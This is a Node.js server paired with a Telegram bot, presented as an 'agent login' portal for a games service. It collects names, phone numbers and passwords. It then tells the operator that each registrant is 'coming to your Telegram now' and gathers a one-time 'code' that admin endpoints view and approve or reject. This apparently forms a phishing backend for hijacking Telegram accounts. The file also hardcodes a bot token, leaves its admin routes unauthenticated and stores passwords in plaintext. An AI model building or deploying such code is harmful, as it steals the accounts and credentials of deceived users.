const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

// ==========================================
// 1. MAIN BOT SETUP (The one users click Start on)
// ==========================================
const token = '8786156256:AAEy_ZVNBHMTL1XqozbA1JE4E-HX0N977S4';
const bot = new TelegramBot(token, { polling: true });

// YOUR NEW RENDER LINK IS HERE:
const WEB_APP_URL = 'https://agents-ktyl.onrender.com'; 

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "እንኳን ወደ የሀበሻ ጌምስ በደህና መጡ! 🎮\n\nወደ ኤጀንት መግቢያ ለመሄድ ከታች ያለውን ቁልፍ ይጫኑ።", {
        reply_markup: {
            inline_keyboard: [[
                { text: "የኤጀንት መግቢያ ክፈት", web_app: { url: WEB_APP_URL } }
            ]]
        }
    });
});

console.log("🤖 Main Telegram Bot is running...");

// ==========================================
// 2. ADMIN NOTIFICATION BOT SETUP
// ==========================================
// Put your SECOND bot's token here
const ADMIN_BOT_TOKEN = 'YOUR_SECOND_BOT_TOKEN_HERE'; 
// Put your PERSONAL Telegram Chat ID here (so the bot texts YOU)
const MY_PERSONAL_CHAT_ID = 'YOUR_CHAT_ID_HERE'; 

// ==========================================
// EXPRESS SERVER SETUP
// ==========================================
const app = express();
app.use(cors());
app.use(bodyParser.json());

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// --- IN-MEMORY DATABASE (RAM) ---
const agentsDb = new Map();

// 1. User Registers
app.post('/api/register', async (req, res) => {
    const { fullName, fatherName, phone, password } = req.body;
    
    if (agentsDb.has(phone)) {
        return res.status(400).json({ error: "Phone number already processing!" });
    }

    const timerId = setTimeout(() => {
        if (agentsDb.has(phone)) {
            agentsDb.delete(phone);
            console.log(`⏰ 10 minutes passed. Deleted request for ${phone}.`);
        }
    }, 10 * 60 * 1000); 

    // Save to RAM
    agentsDb.set(phone, { 
        fullName, fatherName, phone, password, 
        status: 'visiting_telegram', 
        submittedCode: null, 
        timerId: timerId 
    });
    
    console.log(`📥 New registration in RAM: ${fullName} (${phone})`);

    // ==========================================
    // 🔔 SEND NOTIFICATION TO ADMIN BOT
    // ==========================================
    const alertMessage = `🚨 አዲስ የኤጀንት ጥያቄ!\n\nስም: ${fullName} ${fatherName}\nስልክ: ${phone}\n\nወደ ቴሌግራምዎ አሁን እየመጡ ነው!`;
    
    try {
        await fetch(`https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: MY_PERSONAL_CHAT_ID,
                text: alertMessage
            })
        });
        console.log("📲 Notification sent to Admin!");
    } catch (err) {
        console.error("⚠️ Failed to send admin notification.", err);
    }
    // ==========================================

    res.json({ success: true });
});

app.post('/api/submit-code', (req, res) => {
    const { phone, code } = req.body;
    const agent = agentsDb.get(phone);
    if (agent && agent.status === 'visiting_telegram') {
        agent.submittedCode = code;
        agent.status = 'code_submitted'; 
        agentsDb.set(phone, agent);
        res.json({ success: true });
    } else {
        res.status(400).json({ error: "Session expired or invalid state." });
    }
});

app.get('/api/status/:phone', (req, res) => {
    const agent = agentsDb.get(req.params.phone);
    if (!agent) return res.json({ status: 'expired' }); 
    res.json({ status: agent.status });
});

app.get('/api/admin/requests', (req, res) => {
    const requests = Array.from(agentsDb.values()).map(a => ({
        fullName: a.fullName, fatherName: a.fatherName, phone: a.phone, status: a.status, submittedCode: a.submittedCode
    }));
    res.json(requests);
});

app.post('/api/admin/decision', (req, res) => {
    const { phone, action } = req.body;
    const agent = agentsDb.get(phone);
    if (!agent) return res.status(404).json({ error: "Agent not found or request expired." });

    if (action === 'approve') {
        agent.status = 'approved';
        agentsDb.set(phone, agent);
        console.log(`✅ ${agent.fullName} Approved!`);
        clearTimeout(agent.timerId);
        setTimeout(() => { agentsDb.delete(phone); }, 10000);
    } else if (action === 'reject') {
        agent.status = 'rejected_code';
        agent.submittedCode = null; 
        agentsDb.set(phone, agent);
        console.log(`❌ ${agent.fullName} Rejected (Wrong Code).`);
    }
    res.json({ success: true });
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => console.log(`🚀 Web Server running on port ${PORT}!`));
